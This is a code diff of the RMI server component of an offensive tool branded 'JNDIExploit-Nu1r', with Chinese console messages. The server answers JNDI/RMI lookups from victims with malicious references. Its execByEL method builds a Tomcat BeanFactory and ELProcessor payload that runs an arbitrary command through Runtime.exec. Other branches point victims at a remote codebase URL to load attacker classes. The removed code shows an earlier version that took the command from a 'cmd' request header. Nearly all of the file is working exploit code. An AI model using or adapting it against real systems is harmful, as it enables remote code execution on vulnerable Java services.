@@ -11,7 +11,6 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.io.ObjectStreamClass;
 import java.io.OutputStream;
-import java.io.Serializable;
 import java.lang.reflect.Field;
 import java.net.InetSocketAddress;
 import java.net.ServerSocket;
@@ -24,24 +23,22 @@ import java.rmi.server.ObjID;
 import java.rmi.server.RemoteObject;
 import java.rmi.server.UID;
 import java.util.Arrays;
-import java.util.List;
-import java.util.TreeMap;
+import java.util.Objects;
 
 import javax.naming.Reference;
 import javax.naming.StringRefAddr;
 import javax.net.ServerSocketFactory;
+import javax.servlet.http.HttpServletRequest;
 
-import com.nu1r.jndi.controllers.LdapController;
 import com.nu1r.jndi.utils.Config;
 import com.nu1r.jndi.gadgets.utils.Reflections;
-import com.nu1r.jndi.utils.StringUtil;
 import com.sun.jndi.rmi.registry.ReferenceWrapper;
 
 import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
 import org.apache.naming.ResourceRef;
+import org.springframework.web.context.request.RequestAttributes;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
 import sun.rmi.server.UnicastServerRef;
 import sun.rmi.transport.TransportConstants;
 
@@ -62,33 +59,15 @@ import static org.fusesource.jansi.Ansi.ansi;
 })
 public class RMIServer extends InMemoryOperationInterceptor implements Runnable {
 
-    private int          port;
-    private ServerSocket ss;
-    private Object       waitLock = new Object();
-    private boolean      exit;
-    private boolean      hadConnection;
-    private URL          classpathUrl;
+    private final ServerSocket ss;
+    private final Object       waitLock = new Object();
+    private       boolean      exit;
+    private final URL          classpathUrl;
 
 
     public RMIServer(int port, URL classpathUrl) throws IOException {
-        this.port = port;
         this.classpathUrl = classpathUrl;
-        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
-    }
-
-    public boolean waitFor(int i) {
-        try {
-            if (this.hadConnection) {
-                return true;
-            }
-            System.err.println("[+] Waiting for connection");
-            synchronized (this.waitLock) {
-                this.waitLock.wait(i);
-            }
-            return this.hadConnection;
-        } catch (InterruptedException e) {
-            return false;
-        }
+        this.ss = ServerSocketFactory.getDefault().createServerSocket(port);
     }
 
 
@@ -99,7 +78,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         this.exit = true;
         try {
             this.ss.close();
-        } catch (IOException e) {
+        } catch (IOException ignored) {
         }
         synchronized (this.waitLock) {
             this.waitLock.notify();
@@ -107,15 +86,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
     }
 
 
-    public static final void start() {
-//        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
-//            System.err.println(RMIRefServer.class.getName() + "<codebase_url#classname> [<port>]");
-//            System.exit(-1);
-//            return;
-//        }
-//        if ( args.length >= 2 ) {
-//            port = Integer.parseInt(args[ 1 ]);
-//        }
+    public static void start() {
         String url = "http://" + Config.ip + ":" + Config.rmiPort;
 
         try {
@@ -132,7 +103,6 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
     @Override
     public void run() {
         try {
-            @SuppressWarnings("resource")
             Socket s = null;
             try {
                 while (!this.exit && (s = this.ss.accept()) != null) {
@@ -206,8 +176,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                 }
             }
 
-        } catch (SocketException e) {
-            return;
+        } catch (SocketException ignored) {
         } catch (Exception e) {
             e.printStackTrace(System.err);
         }
@@ -244,7 +213,7 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         ObjectInputStream ois = new ObjectInputStream(in) {
 
             @Override
-            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
+            protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException {
                 if ("[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                     return ObjID[].class;
                 } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
@@ -270,11 +239,9 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             handleDGC(ois);
         } else if (read.hashCode() == 0) {
             if (handleRMI(ois, out)) {
-                this.hadConnection = true;
                 synchronized (this.waitLock) {
                     this.waitLock.notifyAll();
                 }
-                return;
             }
         }
 
@@ -289,21 +256,9 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         }
 
         String object = (String) ois.readObject();
-
-        LdapController controller = null;
-        //find controller
-        //根据请求的路径从route中匹配相应的controller
-        for (String key : routes.keySet()) {
-            //compare using wildcard at the end
-            if (object.toLowerCase().startsWith(key)) {
-                controller = routes.get(key);
-                break;
-            }
-        }
-
         System.out.println(ansi().eraseScreen().render(
                 "   @|green █████\\|@ @|red ██\\   ██\\|@ @|yellow ███████\\|@  @|MAGENTA ██████\\|@       @|CYAN ██\\   ██\\ ██\\   ██\\|@ \n" +
-                        "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.3|@\n" +
+                        "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.5|@\n" +
                         "      @|green ██ ||@@|red ████\\ ██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ████\\ ██ |██ |  ██ ||@ @|BG_CYAN JNDIExploit-Nu1r|@\n" +
                         "      @|green ██ ||@@|red ██ ██\\██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@██████\\ @|CYAN ██ ██\\██ |██ |  ██ ||@\n" +
                         "@|green ██\\   ██ ||@@|red ██ \\████ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@\\______|@|CYAN ██ \\████ |██ |  ██ ||@\n" +
@@ -312,22 +267,8 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                         "@|green  \\______/|@@|red  \\__|  \\__||@@|yellow \\_______/|@ @|MAGENTA \\______||@      @|CYAN \\__|  \\__| \\______/|@"));
         System.out.println(ansi().render(Ltime.getLocalTime() + "@|bg_GREEN -----------------------------------------------------------------------------------|@"));
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> RMI 查询 |@" + object + " " + method));
-        String reference = null;
-        String cpstring  = this.classpathUrl.toString();
-//        for (String key : LdapServer.routes.keySet()) {
-//            //compare using wildcard at the end
-//            if (object.toLowerCase().startsWith(key)) {
-//                controller = LdapServer.routes.get(key);
-//                break;
-//            }
-//        }
-//        if (controller == null) {
-//            System.out.println(ansi().render("@|red [!] RMI  服务器  >> 引用名称查询失败|@" + object));
-//            return false;
-//        }
-        URL turl = new URL(cpstring + "#" + reference);
-        out.writeByte(TransportConstants.Return);
-        try (ObjectOutputStream oos = new MarshalOutputStream(out, turl)) {
+        out.writeByte(TransportConstants.Return); // transport op
+        try (ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl)) {
 
             oos.writeByte(TransportConstants.NormalReturn);
             new UID().write(oos);
@@ -339,8 +280,8 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
                 System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 发送本地类加载引用|@"));
                 Reflections.setFieldValue(rw, "wrappee", execByEL());
             } else {
-                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 向目标发送 stub >>|@ %s", turl));
-                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", reference.concat(StringUtil.getVersion(object)), turl.toString()));
+                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RMI  服务器  >> 向目标发送 stub >>|@ %s", new URL(this.classpathUrl, this.classpathUrl.getRef().replace('.', '/').concat(".class"))));
+                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", this.classpathUrl.getRef(), this.classpathUrl.toString()));
             }
 
             Field refF = RemoteObject.class.getDeclaredField("ref");
@@ -355,86 +296,24 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
         return true;
     }
 
-    public ResourceRef execByEL() {
-        try {
-            boolean  var4 = false;
-            Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
-
-            for (int var6 = 0; var6 < var5.length; ++var6) {
-                Thread var7 = var5[var6];
-                if (var7 != null) {
-                    String var3 = var7.getName();
-                    if (!var3.contains("exec") && var3.contains("http")) {
-                        Object var1 = getFV(var7, "target");
-                        if (var1 instanceof Runnable) {
-                            try {
-                                var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
-                            } catch (Exception var13) {
-                                continue;
-                            }
-
-                            List var9 = (List) getFV(var1, "processors");
-
-                            for (int var10 = 0; var10 < var9.size(); ++var10) {
-                                Object var11 = var9.get(var10);
-                                var1 = getFV(var11, "req");
-                                Object var2 = var1.getClass().getMethod("getResponse").invoke(var1);
-                                var3 = (String) var1.getClass().getMethod("getHeader", String.class).invoke(var1, "Testecho");
-                                if (var3 != null && !var3.isEmpty()) {
-                                    var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
-                                    var2.getClass().getMethod("addHeader", String.class, String.class).invoke(var2, "Testecho", var3);
-                                    var4 = true;
-                                }
-                                var3 = (String) var1.getClass().getMethod("getHeader", String.class).invoke(var1, "cmd");
-                                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-                                ref.add(new StringRefAddr("forceString", "x=eval"));
-                                ref.add(new StringRefAddr("x", String.format(
-                                        "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
-                                                "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
-                                                ")",
-                                        var3
-                                        // Config.command
-                                )));
-
-                                return ref;
-                            }
-                        }
-                    }
-                }
-            }
-        }catch (Exception e){
-            e.printStackTrace();
-        }
-        return null;
+    public static void main(String[] args) throws Exception {
+        ReferenceWrapper rw = Reflections.createWithoutConstructor(ReferenceWrapper.class);
+        Reflections.setFieldValue(rw, "wrappee", execByEL());
     }
 
-    private static Object getFV(Object var0, String var1) throws Exception {
-        Field var2 = null;
-        Class var3 = var0.getClass();
+    public static ResourceRef execByEL() {
+        ResourceRef        ref               = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
+        ref.add(new StringRefAddr("forceString", "x=eval"));
+        ref.add(new StringRefAddr("x", String.format(
+                "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(" +
+                        "\"java.lang.Runtime.getRuntime().exec('%s')\"" +
+                        ")",
+                Config.command
+        )));
 
-        while (var3 != Object.class) {
-            try {
-                var2 = var3.getDeclaredField(var1);
-                break;
-            } catch (NoSuchFieldException var5) {
-                var3 = var3.getSuperclass();
-            }
-        }
-
-        if (var2 == null) {
-            throw new NoSuchFieldException(var1);
-        } else {
-            var2.setAccessible(true);
-            return var2.get(var0);
-        }
+        return ref;
     }
 
-
-    /**
-     * @param ois
-     * @throws IOException
-     * @throws ClassNotFoundException
-     */
     private static void handleDGC(ObjectInputStream ois) throws IOException, ClassNotFoundException {
         ois.readInt(); // method
         ois.readLong(); // hash
@@ -442,41 +321,14 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
     }
 
 
-    @SuppressWarnings("deprecation")
-    protected static Object makeDummyObject(String className) {
-        try {
-            ClassLoader isolation = new ClassLoader() {
-            };
-            ClassPool cp = new ClassPool();
-            cp.insertClassPath(new ClassClassPath(Dummy.class));
-            CtClass clazz = cp.get(Dummy.class.getName());
-            clazz.setName(className);
-            return clazz.toClass(isolation).newInstance();
-        } catch (Exception e) {
-            e.printStackTrace();
-            return new byte[0];
-        }
-    }
-
-    public static class Dummy implements Serializable {
-
-        private static final long serialVersionUID = 1L;
-
-    }
-
     static final class MarshalOutputStream extends ObjectOutputStream {
 
-        private URL sendUrl;
+        private final URL sendUrl;
 
 
         public MarshalOutputStream(OutputStream out, URL u) throws IOException {
             super(out);
             this.sendUrl = u;
-        }
-
-
-        MarshalOutputStream(OutputStream out) throws IOException {
-            super(out);
         }
 
 
@@ -487,13 +339,13 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                 writeObject(null);
             } else {
-                URL[]  us = ((URLClassLoader) cl.getClassLoader()).getURLs();
-                String cb = "";
+                URL[]         us = ((URLClassLoader) cl.getClassLoader()).getURLs();
+                StringBuilder cb = new StringBuilder();
 
                 for (URL u : us) {
-                    cb += u.toString();
+                    cb.append(u.toString());
                 }
-                writeObject(cb);
+                writeObject(cb.toString());
             }
         }
 
@@ -506,6 +358,4 @@ public class RMIServer extends InMemoryOperationInterceptor implements Runnable 
             annotateClass(cl);
         }
     }
-
-    public static TreeMap<String, LdapController> routes = new TreeMap<String, LdapController>();
 }
